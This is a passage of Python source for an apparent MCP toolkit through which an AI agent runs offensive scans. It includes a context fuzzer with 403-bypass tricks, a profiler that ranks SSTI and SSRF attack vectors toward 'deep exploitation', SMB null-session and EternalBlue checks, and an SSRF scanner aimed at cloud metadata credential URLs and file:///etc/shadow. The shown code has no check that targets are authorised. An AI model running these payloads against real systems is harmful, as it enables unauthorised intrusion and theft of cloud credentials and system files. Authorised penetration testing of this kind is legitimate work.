        "high_findings": [f for f in findings if f.get("severity") == "HIGH"],
        "medium_findings": [f for f in findings if f.get("severity") == "MEDIUM"],
        "exposed_endpoints": exposed_endpoints,
        "all_findings": findings,
        "recommendations": _generate_smart_recommendations(findings, detected_stack),
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("smart_vulnerability_detector", target, output)
    log_tool_execution("smart_vulnerability_detector", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


def _generate_smart_recommendations(findings: List[Dict], stack: List[str]) -> List[str]:
    """Generate actionable recommendations based on findings."""
    recs = []
    finding_types = [f.get("type", "") for f in findings]
    
    if any("SSRF" in t for t in finding_types):
        recs.append("CRITICAL: SSRF detected - investigate cloud metadata access, check IAM roles")
    if any("403_BYPASS" in t for t in finding_types):
        recs.append("CRITICAL: 403 bypass found - access control misconfiguration confirmed")
    if any("EXPOSED_ENDPOINT" in t for t in finding_types):
        recs.append("HIGH: Sensitive endpoints exposed - review access controls immediately")
    if any("INFO_DISCLOSURE" in t for t in finding_types):
        recs.append("HIGH: Information leaking via error pages - implement custom error handlers")
    if "golang" in stack:
        recs.append("STACK: Golang detected - test /debug/pprof, check template injection {{.}}")
    if "aws" in stack:
        recs.append("STACK: AWS detected - enumerate S3 buckets, test SSRF to metadata service")
    if not recs:
        recs.append("No critical findings in quick scan - recommend deep scan with scan_depth='deep'")
    return recs


@mcp.tool()
@resolve_references
async def context_fuzzer(
    target: str,
    mode: str = "smart",
    wordlist_type: str = "auto",
    follow_redirects: bool = True,
    timeout: int = 300
) -> str:
    """
    Context-aware fuzzer that analyzes 403/422/401 responses to discover hidden endpoints.
    Modes: smart (auto-detect stack and adapt), aggressive (all techniques), stealth (slow + evasive)
    Wordlist types: auto, golang, aws, api, config, full
    Uses responses to intelligently adapt fuzzing strategy.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("context_fuzzer", target, 8)
    inputs = {"target": target, "mode": mode, "wordlist_type": wordlist_type}
    
    url = target if target.startswith("http") else f"https://{target}"
    discovered = []
    
    # Step 1: Baseline + stack detection
    progress.update("Baseline analysis", "Detecting target stack")
    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
    baseline = run_command_advanced(baseline_cmd, timeout=20, trace=trace)
    
    # Auto-detect wordlist based on stack
    detected_tech = []
    headers_lower = baseline["stdout"].lower()
    if any(x in headers_lower for x in ["go", "golang", "gin", "echo", "fiber"]):
        detected_tech.append("golang")
    if any(x in headers_lower for x in ["x-amzn", "x-amz", "cloudfront", "awselb"]):
        detected_tech.append("aws")
    if any(x in headers_lower for x in ["express", "node", "x-powered-by: express"]):
        detected_tech.append("node")
    if any(x in headers_lower for x in ["php", "laravel", "symfony"]):
        detected_tech.append("php")
    
    # Step 2: Build smart wordlist
    progress.update("Building adaptive wordlist")
    wordlist = []
    
    # Always include sensitive files
    wordlist.extend(AdvancedPayloads.config_files_wordlist())
    wordlist.extend(AdvancedPayloads.sensitive_dirs_wordlist())
    
    # Stack-specific additions
    if "golang" in detected_tech or wordlist_type in ["golang", "full"]:
        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["framework_paths"])
    if "aws" in detected_tech or wordlist_type in ["aws", "full"]:
        wordlist.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
    
    # API-specific paths
    api_paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/internal",
        "/graphql", "/graphiql", "/playground",
        "/rest", "/rpc", "/ws", "/websocket",
        "/health", "/status", "/info", "/version",
    ]
    wordlist.extend(api_paths)
    
    # Deduplicate
    wordlist = list(dict.fromkeys(wordlist))
    
    # Step 3: Fuzz with response analysis
    progress.update("Fuzzing endpoints", f"{len(wordlist)} paths to test")
    response_map = {"200": [], "301": [], "302": [], "401": [], "403": [], "405": [], "422": [], "500": []}
    
    for path in wordlist[:100]:  # Limit to prevent timeout
        fuzz_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
        fuzz_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
                   "-w", "%{http_code}|%{size_download}", fuzz_url]
        fuzz_result = run_command_advanced(fuzz_cmd, timeout=10, trace=trace)
        parts = fuzz_result["stdout"].strip().split("|")
        if len(parts) == 2:
            code, size = parts[0], parts[1]
            if code in response_map:
                response_map[code].append({"path": path, "size": size})
            if code in ["200", "301", "302"]:
                discovered.append({"path": path, "status": code, "size": size, "type": "accessible"})
            elif code == "401":
                discovered.append({"path": path, "status": code, "size": size, "type": "auth_required"})
            elif code == "403":
                discovered.append({"path": path, "status": code, "size": size, "type": "forbidden"})
            elif code == "405":
                discovered.append({"path": path, "status": code, "size": size, "type": "method_not_allowed"})
            elif code == "422":
                discovered.append({"path": path, "status": code, "size": size, "type": "param_required"})
    
    # Step 4: 403 bypass attempts
    progress.update("403 bypass testing")
    bypass_results = []
    forbidden_endpoints = response_map.get("403", [])[:5]
    bypass_techniques = AdvancedPayloads.waf_bypass_payloads()["path_bypass_403"]
    
    for endpoint in forbidden_endpoints:
        original_path = endpoint["path"]
        for bypass_path in bypass_techniques[:8]:
            # Replace /admin with the bypass variant
            test_path = bypass_path.replace("/admin", f"/{original_path.strip('/')}")
            test_url = f"{url.rstrip('/')}{test_path}"
            bypass_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", test_url]
            bypass_result = run_command_advanced(bypass_cmd, timeout=10, trace=trace)
            if bypass_result["stdout"].strip() in ["200", "301", "302"]:
                bypass_results.append({
                    "original_path": original_path,
                    "bypass_path": test_path,
                    "status": bypass_result["stdout"].strip(),
                    "severity": "CRITICAL"
                })
                break
    
    # Step 5: Header-based 403 bypass
    progress.update("Header bypass testing")
    header_bypasses = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
    for endpoint in forbidden_endpoints[:3]:
        for header in header_bypasses[:5]:
            h_name, h_val = header.split(": ", 1)
            hdr_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
            hdr_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}",
                      "-H", f"{h_name}: {h_val}", hdr_url]
            hdr_result = run_command_advanced(hdr_cmd, timeout=10, trace=trace)
            if hdr_result["stdout"].strip() == "200":
                bypass_results.append({
                    "original_path": endpoint["path"],
                    "bypass_header": header,
                    "status": "200",
                    "severity": "CRITICAL"
                })
                break
    
    # Step 6: Method probing on 405 endpoints
    progress.update("Method probing on 405 endpoints")
    method_discoveries = []
    method_endpoints = response_map.get("405", [])[:5]
    http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
    
    for endpoint in method_endpoints:
        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
        for method in http_methods:
            method_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
                         "-w", "%{http_code}", "-X", method, ep_url]
            method_result = run_command_advanced(method_cmd, timeout=10, trace=trace)
            code = method_result["stdout"].strip()
            if code not in ["405", "404", "000"]:
                method_discoveries.append({
                    "path": endpoint["path"], "method": method, "status": code
                })
    
    # Step 7: Parameter discovery on 422 endpoints
    progress.update("Parameter discovery on 422 endpoints")
    param_discoveries = []
    param_endpoints = response_map.get("422", [])[:3]
    common_params = ["id", "user", "email", "name", "token", "key", "q", "search", "page", "limit",
                    "admin", "debug", "action", "type", "format", "callback"]
    
    for endpoint in param_endpoints:
        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
        for param in common_params:
            param_url = f"{ep_url}?{param}=test"
            param_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", param_url]
            param_result = run_command_advanced(param_cmd, timeout=10, trace=trace)
            code = param_result["stdout"].strip()
            if code != "422":  # Different response = param accepted
                param_discoveries.append({
                    "path": endpoint["path"], "param": param,
                    "status_without": "422", "status_with": code
                })
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "detected_stack": detected_tech,
        "mode": mode,
        "total_discovered": len(discovered),
        "discovered_endpoints": discovered,
        "accessible_200": response_map.get("200", []),
        "auth_required_401": response_map.get("401", []),
        "forbidden_403": response_map.get("403", []),
        "method_denied_405": response_map.get("405", []),
        "param_required_422": response_map.get("422", []),
        "bypass_results": bypass_results,
        "method_discoveries": method_discoveries,
        "param_discoveries": param_discoveries,
        "recommendations": [
            f"Discovered {len(discovered)} endpoints total",
            f"Found {len(bypass_results)} 403 bypasses" if bypass_results else "No 403 bypasses found",
            f"Found {len(method_discoveries)} method variations" if method_discoveries else "No method variations",
            f"Found {len(param_discoveries)} parameter hints" if param_discoveries else "No param hints",
        ],
    }
    
    output = chain_engine.enrich_with_context("context_fuzzer", target, output)
    log_tool_execution("context_fuzzer", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def target_profiler(
    target: str,
    profile_depth: str = "standard",
    timeout: int = 120
) -> str:
    """
    Profiles target technology stack and generates customized attack vectors.
    Creates stack-specific payloads (Golang, AWS, Node, PHP, Java, .NET).
    Returns prioritized attack plan based on detected technologies.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("target_profiler", target, 6)
    inputs = {"target": target, "profile_depth": profile_depth}
    
    url = target if target.startswith("http") else f"https://{target}"
    
    # Step 1: Multi-probe technology detection
    progress.update("Multi-probe technology detection")
    probes = {
        "headers": ["curl", "-skI", "--max-time", "15", "-L", url],
        "body": ["curl", "-sk", "--max-time", "15", "-L", url],
        "error_404": ["curl", "-sk", "--max-time", "10", f"{url}/nonexistent_path_xyz123"],
        "options": ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url],
    }
    
    probe_results = {}
    for name, cmd in probes.items():
        result = run_command_advanced(cmd, timeout=20, trace=trace)
        probe_results[name] = result["stdout"]
    
    # Step 2: Stack identification
    progress.update("Stack identification")
    all_content = " ".join(probe_results.values()).lower()
    
    profile = {
        "web_server": None,
        "language": None,
        "framework": None,
        "cloud_provider": None,
        "waf": None,
        "cms": None,
        "api_type": None,
        "database_hints": [],
        "confidence": {},
    }
    
    # Web server detection
    server_patterns = {
        "nginx": "server: nginx", "apache": "server: apache",
        "iis": "server: microsoft-iis", "caddy": "server: caddy",
        "gunicorn": "server: gunicorn", "uvicorn": "server: uvicorn",
    }
    for srv, pattern in server_patterns.items():
        if pattern in all_content:
            profile["web_server"] = srv
            break
    
    # Language detection
    lang_indicators = {
        "golang": ["x-powered-by: go", "server: go", "goroutine", "gin-gonic", "echo", "fiber"],
        "python": ["x-powered-by: python", "django", "flask", "fastapi", "gunicorn", "uvicorn"],
        "php": ["x-powered-by: php", ".php", "laravel", "symfony", "codeigniter"],
        "java": ["x-powered-by: java", "jsessionid", "spring", "tomcat", "jetty"],
        "node": ["x-powered-by: express", "node", "next.js", "nuxt"],
        "ruby": ["x-powered-by: ruby", "rails", "sinatra", "puma"],
        "dotnet": ["x-powered-by: asp.net", "x-aspnet-version", ".aspx", "blazor"],
    }
    for lang, indicators in lang_indicators.items():
        if any(ind in all_content for ind in indicators):
            profile["language"] = lang
            profile["confidence"]["language"] = "high"
            break
    
    # Cloud provider detection
    cloud_patterns = {
        "aws": ["x-amzn-", "x-amz-", "amazons3", "awselb", "cloudfront", "amazonaws"],
        "gcp": ["x-goog-", "google cloud", "gfe", "appengine"],
        "azure": ["x-ms-", "azure", "windows-azure", "trafficmanager"],
        "cloudflare": ["cf-ray", "server: cloudflare"],
    }
    for cloud, patterns in cloud_patterns.items():
        if any(p in all_content for p in patterns):
            profile["cloud_provider"] = cloud
            break
    
    # WAF detection
    waf_patterns = {
        "cloudflare": ["cf-ray", "server: cloudflare"],
        "aws_waf": ["x-amzn-waf", "awswaf"],
        "modsecurity": ["mod_security", "modsecurity"],
        "imperva": ["incap_ses", "x-iinfo"],
        "akamai": ["akamai", "x-akamai"],
        "f5": ["x-wa-info", "bigip"],
    }
    for waf, patterns in waf_patterns.items():
        if any(p in all_content for p in patterns):
            profile["waf"] = waf
            break
    
    # Step 3: Generate stack-specific attack vectors
    progress.update("Generating attack vectors")
    attack_vectors = []
    
    if profile["language"] == "golang":
        attack_vectors.extend([
            {"vector": "Golang debug endpoints", "paths": ["/debug/pprof/", "/debug/vars", "/metrics"],
             "severity": "HIGH", "category": "info_disclosure"},
            {"vector": "Golang template injection", "payloads": ["{{.}}", "{{printf \"%v\" .}}"],
             "severity": "CRITICAL", "category": "ssti"},
            {"vector": "Golang race condition", "detail": "Test concurrent requests on state-changing endpoints",
             "severity": "HIGH", "category": "logic"},
        ])
    
    if profile["language"] == "python":
        attack_vectors.extend([
            {"vector": "Python debug mode", "paths": ["/debug", "/?__debugger__=yes"],
             "severity": "HIGH", "category": "info_disclosure"},
            {"vector": "Jinja2 SSTI", "payloads": ["{{7*7}}", "{{config}}", "{{request.environ}}"],
             "severity": "CRITICAL", "category": "ssti"},
        ])
    
    if profile["language"] == "php":
        attack_vectors.extend([
            {"vector": "PHP info disclosure", "paths": ["/phpinfo.php", "/info.php"],
             "severity": "HIGH", "category": "info_disclosure"},
            {"vector": "PHP type juggling", "detail": "Test == vs === in auth",
             "severity": "HIGH", "category": "auth_bypass"},
        ])
    
    if profile["cloud_provider"] == "aws":
        attack_vectors.extend([
            {"vector": "AWS metadata SSRF", "payloads": ["http://169.254.169.254/latest/meta-data/"],
             "severity": "CRITICAL", "category": "ssrf"},
            {"vector": "S3 bucket enumeration", "detail": "Test common bucket naming patterns",
             "severity": "HIGH", "category": "cloud"},
            {"vector": "AWS credentials exposure", "paths": ["/.aws/credentials", "/.env"],
             "severity": "CRITICAL", "category": "credentials"},
        ])
    
    if profile["waf"]:
        waf_bypasses = AdvancedPayloads.waf_bypass_payloads()
        attack_vectors.append({
            "vector": f"WAF bypass ({profile['waf']})",
            "techniques": list(waf_bypasses.keys()),
            "severity": "HIGH", "category": "waf_bypass"
        })
    
    # Step 4: Priority ranking
    progress.update("Priority ranking")
    # Sort by severity
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    attack_vectors.sort(key=lambda x: severity_order.get(x.get("severity", "LOW"), 4))
    
    # Step 5: Generate recommended tool chain
    progress.update("Generating tool chain recommendations")
    recommended_tools = []
    if profile["cloud_provider"] == "aws":
        recommended_tools.extend(["ssrf_scanner", "context_fuzzer", "smart_vulnerability_detector"])
    if profile["language"]:
        recommended_tools.extend(["ssti_scanner", "nuclei_scan", "api_endpoint_discovery"])
    if profile["waf"]:
        recommended_tools.extend(["waf_fingerprint", "context_fuzzer"])
    recommended_tools.extend(["header_security_audit", "cors_scanner"])
    
    output = {
        "status": "success",
        "target": target,
        "profile": profile,
        "attack_vectors": attack_vectors,
        "recommended_tool_chain": list(dict.fromkeys(recommended_tools)),
        "execution_order": [
            "Phase 1: context_fuzzer (discover endpoints)",
            "Phase 2: smart_vulnerability_detector (critical vulns)",
            "Phase 3: Stack-specific injection testing",
            "Phase 4: Deep exploitation of confirmed vulns",
        ],
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("target_profiler", target, output)
    log_tool_execution("target_profiler", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)




# ============================================================================
# ENHANCED MODULES — PHASE 2: DEEP TOOL UPGRADES
# ============================================================================

@mcp.tool()
@resolve_references
async def advanced_arp_discovery(
    network: str = "192.168.1.0/24",
    mode: str = "auto",
    timeout: int = 60
) -> str:
    """
    Enhanced network discovery with multiple fallback modes.
    Mode: auto (try all), arp (requires root), nmap_ping, ip_neighbor, proc_arp
    Detects: Rogue DHCP, ARP spoofing, undocumented devices, IP conflicts.
    """
    target = InputValidator.sanitize_target(network)
    trace, progress, exec_dir = _init_tool_context("advanced_arp_discovery", target, 6)
    inputs = {"network": network, "mode": mode}
    
    hosts_discovered = []
    method_used = None
    
    # Step 1: Try arp-scan (requires root/CAP_NET_RAW)
    progress.update("Trying arp-scan")
    if mode in ["auto", "arp"]:
        arp_cmd = ["arp-scan", "--localnet", "-q"]
        if network != "192.168.1.0/24":
            arp_cmd = ["arp-scan", network, "-q"]
        result = run_command_advanced(arp_cmd, timeout=30, trace=trace)
        if result["success"] and result["stdout"].strip():
            method_used = "arp-scan"
            for line in result["stdout"].split("\n"):
                parts = line.split("\t")
                if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
                    hosts_discovered.append({
                        "ip": parts[0], "mac": parts[1], "vendor": parts[2] if len(parts) > 2 else "Unknown"
                    })
    
    # Step 2: Fallback - nmap ping scan
    if not hosts_discovered and mode in ["auto", "nmap_ping"]:
        progress.update("Fallback: nmap ping scan")
        nmap_cmd = ["nmap", "-sn", "-n", network]
        result = run_command_advanced(nmap_cmd, timeout=45, trace=trace)
        if result["success"]:
            method_used = "nmap-ping"
            ip_pattern = re.compile(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)")
            mac_pattern = re.compile(r"MAC Address: ([0-9A-F:]+)\s*\((.*)\)", re.IGNORECASE)
            current_ip = None
            for line in result["stdout"].split("\n"):
                ip_match = ip_pattern.search(line)
                if ip_match:
                    current_ip = ip_match.group(1)
                mac_match = mac_pattern.search(line)
                if mac_match and current_ip:
                    hosts_discovered.append({
                        "ip": current_ip, "mac": mac_match.group(1), "vendor": mac_match.group(2)
                    })
                    current_ip = None
                elif current_ip and "Host is up" in line:
                    hosts_discovered.append({"ip": current_ip, "mac": "N/A", "vendor": "N/A"})
                    current_ip = None
    
    # Step 3: Fallback - ip neighbor
    if not hosts_discovered and mode in ["auto", "ip_neighbor"]:
        progress.update("Fallback: ip neighbor")
        ip_cmd = ["ip", "neighbor", "show"]
        result = run_command_advanced(ip_cmd, timeout=10, trace=trace)
        if result["success"]:
            method_used = "ip-neighbor"
            for line in result["stdout"].split("\n"):
                parts = line.split()
                if len(parts) >= 5 and "lladdr" in parts:
                    ip = parts[0]
                    mac_idx = parts.index("lladdr") + 1
                    mac = parts[mac_idx] if mac_idx < len(parts) else "N/A"
                    state = parts[-1] if parts else "unknown"
                    hosts_discovered.append({"ip": ip, "mac": mac, "vendor": "N/A", "state": state})
    
    # Step 4: Fallback - /proc/net/arp
    if not hosts_discovered and mode in ["auto", "proc_arp"]:
        progress.update("Fallback: /proc/net/arp")
        result = run_command_advanced(["cat", "/proc/net/arp"], timeout=5, trace=trace)
        if result["success"]:
            method_used = "proc-arp"
            for line in result["stdout"].split("\n")[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 4:
                    hosts_discovered.append({
                        "ip": parts[0], "mac": parts[3], "vendor": "N/A",
                        "flags": parts[2] if len(parts) > 2 else ""
                    })
    
    # Step 5: Security analysis
    progress.update("Security analysis")
    security_alerts = []
    
    # Check for duplicate IPs (IP conflict)
    ip_list = [h["ip"] for h in hosts_discovered]
    for ip in set(ip_list):
        if ip_list.count(ip) > 1:
            security_alerts.append({
                "type": "IP_CONFLICT", "severity": "HIGH",
                "detail": f"Multiple hosts claim IP {ip} - possible ARP spoofing"
            })
    
    # Check for duplicate MACs (spoofing indicator)
    mac_list = [h.get("mac", "N/A") for h in hosts_discovered if h.get("mac") != "N/A"]
    for mac in set(mac_list):
        if mac_list.count(mac) > 1:
            ips_with_mac = [h["ip"] for h in hosts_discovered if h.get("mac") == mac]
            security_alerts.append({
                "type": "MAC_DUPLICATE", "severity": "CRITICAL",
                "detail": f"MAC {mac} appears on multiple IPs: {ips_with_mac} - ARP SPOOFING?"
            })
    
    # Check for common gateway IPs
    gateway_ips = [h for h in hosts_discovered if h["ip"].endswith(".1") or h["ip"].endswith(".254")]
    if len(gateway_ips) > 2:
        security_alerts.append({
            "type": "ROGUE_GATEWAY", "severity": "CRITICAL",
            "detail": f"Multiple gateway-like IPs detected - possible rogue DHCP/gateway"
        })
    
    output = {
        "status": "success",
        "network": network,
        "method_used": method_used or "none_available",
        "hosts_found": len(hosts_discovered),
        "hosts": hosts_discovered,
        "security_alerts": security_alerts,
        "fallback_chain": "arp-scan → nmap -sn → ip neighbor → /proc/net/arp",
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("advanced_arp_discovery", target, output)
    log_tool_execution("advanced_arp_discovery", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def advanced_smb_enum(
    target: str,
    mode: str = "auto",
    username: str = "",
    password: str = "",
    timeout: int = 120
) -> str:
    """
    Enhanced SMB/Windows enumeration with multiple tool fallbacks.
    Uses: enum4linux, smbmap, smbclient, crackmapexec, nmap smb scripts.
    Detects: Null sessions, guest access, weak shares, domain misconfig.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("advanced_smb_enum", target, 7)
    inputs = {"target": target, "mode": mode}
    
    findings = {"shares": [], "users": [], "groups": [], "policies": [], "vulnerabilities": []}
    method_used = []
    
    # Step 1: Check SMB port availability
    progress.update("Checking SMB port")
    port_check = run_command_advanced(
        ["bash", "-c", f"echo | timeout 5 bash -c 'cat < /dev/tcp/{target}/445' 2>/dev/null && echo OPEN || echo CLOSED"],
        timeout=10, trace=trace
    )
    smb_open = "OPEN" in port_check.get("stdout", "")
    
    if not smb_open:
        # Try with nmap
        nmap_check = run_command_advanced(["nmap", "-p", "445", "-Pn", "--open", target], timeout=15, trace=trace)
        smb_open = "445/tcp" in nmap_check.get("stdout", "") and "open" in nmap_check.get("stdout", "")
    
    if not smb_open:
        output = {
            "status": "success", "target": target,
            "smb_port_open": False,
            "detail": "Port 445 (SMB) is closed/filtered on target",
            "recommendation": "SMB enumeration not applicable - try other services"
        }
        progress.update("Complete")
        output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
        log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)
    
    # Step 2: Try enum4linux
    progress.update("Trying enum4linux")
    enum4linux_cmd = ["enum4linux", "-a", target]
    if username:
        enum4linux_cmd.extend(["-u", username, "-p", password or ""])
    result = run_command_advanced(enum4linux_cmd, timeout=60, trace=trace)
    if result["success"] and len(result["stdout"]) > 100:
        method_used.append("enum4linux")
        # Parse shares
        for line in result["stdout"].split("\n"):
            if "Mapping:" in line or "disk" in line.lower():
                findings["shares"].append(line.strip())
            if "user:" in line.lower():
                findings["users"].append(line.strip())
    
    # Step 3: Try smbmap
    progress.update("Trying smbmap")
    smbmap_cmd = ["smbmap", "-H", target]
    if username:
        smbmap_cmd.extend(["-u", username, "-p", password or ""])
    else:
        smbmap_cmd.extend(["-u", "", "-p", ""])  # Null session
    result = run_command_advanced(smbmap_cmd, timeout=30, trace=trace)
    if result["success"]:
        method_used.append("smbmap")
        for line in result["stdout"].split("\n"):
            if "READ" in line or "WRITE" in line or "NO ACCESS" in line:
                findings["shares"].append(line.strip())
                if "WRITE" in line:
                    findings["vulnerabilities"].append({
                        "type": "WRITABLE_SHARE", "severity": "CRITICAL",
                        "detail": f"Writable share found: {line.strip()}"
                    })
    
    # Step 4: Try smbclient for null session
    progress.update("Null session testing")
    smbclient_cmd = ["smbclient", "-N", "-L", f"//{target}"]
    result = run_command_advanced(smbclient_cmd, timeout=15, trace=trace)
    if result["success"] and "Sharename" in result["stdout"]:
        method_used.append("smbclient-null")
        findings["vulnerabilities"].append({
            "type": "NULL_SESSION", "severity": "HIGH",
            "detail": "Anonymous/null session SMB access possible"
        })
    
    # Step 5: Nmap SMB scripts
    progress.update("Nmap SMB scripts")
    nmap_smb_cmd = ["nmap", "-p", "445", "--script", 
                    "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln-*",
                    "-Pn", target]
    result = run_command_advanced(nmap_smb_cmd, timeout=60, trace=trace)
    if result["success"]:
        method_used.append("nmap-smb-scripts")
        stdout = result["stdout"]
        if "message_signing: disabled" in stdout.lower():
            findings["vulnerabilities"].append({
                "type": "SMB_SIGNING_DISABLED", "severity": "HIGH",
                "detail": "SMB message signing disabled - MITM possible"
            })
        if "smb-vuln-ms17-010" in stdout:
            findings["vulnerabilities"].append({
                "type": "ETERNALBLUE", "severity": "CRITICAL",
                "detail": "MS17-010 (EternalBlue) vulnerability detected!"
            })
        if "guest" in stdout.lower() and "account" in stdout.lower():
            findings["vulnerabilities"].append({
                "type": "GUEST_ACCOUNT", "severity": "HIGH",
                "detail": "Guest account appears to be enabled"
            })
    
    # Step 6: Security summary
    progress.update("Security analysis")
    output = {
        "status": "success",
        "target": target,
        "smb_port_open": True,
        "methods_used": method_used,
        "shares": list(set(findings["shares"])),
        "users": list(set(findings["users"])),
        "vulnerabilities": findings["vulnerabilities"],
        "total_vulns": len(findings["vulnerabilities"]),
        "critical_count": len([v for v in findings["vulnerabilities"] if v.get("severity") == "CRITICAL"]),
        "fallback_chain": "enum4linux → smbmap → smbclient → nmap smb-scripts",
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
    log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enhanced_ssrf_scanner(
    target: str,
    params: str = "url,redirect,uri,path,next,link,proxy,file,document,src,href,dest,target,rurl,return,window,data,reference,site,html,val,validate,domain,callback,feed,host,port,to,out,view,dir,show,navigation,open,img,load,content",
    include_cloud: bool = True,
    include_internal: bool = True,
    timeout: int = 180
) -> str:
    """
    Enhanced SSRF scanner with cloud metadata, internal network, and protocol-specific payloads.
    Tests: AWS/GCP/Azure metadata, internal services (Redis, MySQL, ES, etc.), file:// and gopher://.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enhanced_ssrf_scanner", target, 6)
    inputs = {"target": target, "params": params, "include_cloud": include_cloud}
    
    url = target if target.startswith("http") else f"https://{target}"
    param_list = [p.strip() for p in params.split(",")]
    ssrf_findings = []
    
    # Build SSRF payloads
    progress.update("Building SSRF payloads")
    payloads = []
    
    if include_cloud:
        # AWS metadata
        payloads.extend([
            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
            ("aws_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("aws_userdata", "http://169.254.169.254/latest/user-data"),
            ("aws_identity", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
            ("aws_ecs", "http://169.254.170.2/v2/credentials"),
            # GCP metadata
            ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
            ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            # Azure metadata
            ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ])
    
    if include_internal:
        # Internal services
        payloads.extend([
            ("localhost", "http://127.0.0.1/"),
            ("localhost_admin", "http://127.0.0.1/admin"),
            ("redis", "http://127.0.0.1:6379/"),
            ("elasticsearch", "http://127.0.0.1:9200/"),
            ("mysql", "http://127.0.0.1:3306/"),
            ("postgres", "http://127.0.0.1:5432/"),
            ("mongodb", "http://127.0.0.1:27017/"),
            ("memcached", "http://127.0.0.1:11211/"),
            ("docker_api", "http://127.0.0.1:2375/containers/json"),
            ("kubernetes_api", "http://127.0.0.1:10250/pods"),
            ("internal_10", "http://10.0.0.1/"),
            ("internal_172", "http://172.16.0.1/"),
            ("internal_192", "http://192.168.1.1/"),
        ])
    
    # Protocol payloads
    payloads.extend([
        ("file_passwd", "file:///etc/passwd"),
        ("file_hosts", "file:///etc/hosts"),
        ("file_shadow", "file:///etc/shadow"),
    ])
    
    # Step 2: Test each param with each payload
    progress.update("Testing SSRF payloads", f"{len(param_list)} params x {len(payloads)} payloads")
    
    # Get baseline response for comparison
    baseline_cmd = ["curl", "-sk", "--max-time", "10", url]
    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
    baseline_size = len(baseline_result.get("stdout", ""))
    
    for param in param_list[:15]:  # Limit params
        for payload_name, payload_url in payloads[:15]:  # Limit payloads
            test_url = f"{url}?{param}={payload_url}"
            test_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}", test_url]
            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
            
            stdout = result.get("stdout", "")
            # Check for SSRF indicators
            ssrf_indicators = {
                "aws_metadata": ["ami-id", "instance-id", "local-ipv4", "security-credentials"],
                "gcp_metadata": ["computeMetadata", "service-accounts", "access_token"],
                "azure_metadata": ["subscriptionId", "resourceGroupName"],
                "redis": ["redis_version", "REDIS"],
                "elasticsearch": ["cluster_name", "elasticsearch", "tagline"],
                "file_passwd": ["root:x:0", "/bin/bash", "/bin/sh"],
                "docker_api": ["Container", "Image", "Created"],
                "kubernetes_api": ["Pod", "namespace", "container"],
            }
            
            indicators = ssrf_indicators.get(payload_name, [])
            if any(ind in stdout for ind in indicators):
                ssrf_findings.append({
                    "type": "CONFIRMED_SSRF", "severity": "CRITICAL",
                    "param": param, "payload": payload_url, "payload_name": payload_name,
                    "evidence": stdout[:200],
                    "detail": f"SSRF confirmed via param '{param}' to {payload_name}"
                })
            elif len(stdout) > baseline_size * 1.5 and len(stdout) > 100:
                # Significant size difference might indicate SSRF
                ssrf_findings.append({
                    "type": "POSSIBLE_SSRF", "severity": "HIGH",
                    "param": param, "payload": payload_url, "payload_name": payload_name,
                    "detail": f"Response size anomaly (baseline:{baseline_size}, got:{len(stdout)})"
                })
    
    # Step 3: Time-based SSRF detection
    progress.update("Time-based SSRF detection")
    import time
    for param in param_list[:5]:
        # Use a non-routable IP to detect blind SSRF via timeout
        start = time.time()
        timeout_url = f"{url}?{param}=http://10.255.255.1/"
        timeout_cmd = ["curl", "-sk", "--max-time", "8", timeout_url]
        run_command_advanced(timeout_cmd, timeout=12, trace=trace)
